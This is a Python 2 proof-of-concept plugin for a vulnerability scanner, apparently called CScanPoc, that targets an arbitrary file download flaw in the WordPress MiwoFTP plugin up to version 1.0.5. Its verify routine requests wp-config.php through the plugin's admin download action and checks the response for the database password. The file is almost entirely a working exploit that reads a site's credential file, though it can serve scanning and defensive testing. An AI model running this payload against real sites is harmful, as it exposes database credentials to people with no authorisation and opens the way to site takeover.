# coding: utf-8
import re
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_0101' # 平台漏洞编号，留空
    name = 'WordPress MiwoFTP <=1.0.5 任意文件下载' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2015-05-07'  # 漏洞公布时间
    desc = '''
    WordPress MiwoFTP Plugin <= 1.0.5 - Arbitrary File Download.
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36801/' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress MiwoFTP <=1.0.5' # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '710543b6-9ca7-496c-8377-eb6687c19f94' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            payload = ('/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download'
                       '&item=wp-config.php&order=name&srt=yes')
            verify_url = self.target + payload
            request = urllib2.Request(verify_url)
            response = urllib2.urlopen(request)
            reg = re.compile("DB_PASSWORD")
            if reg.findall(response.read()):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()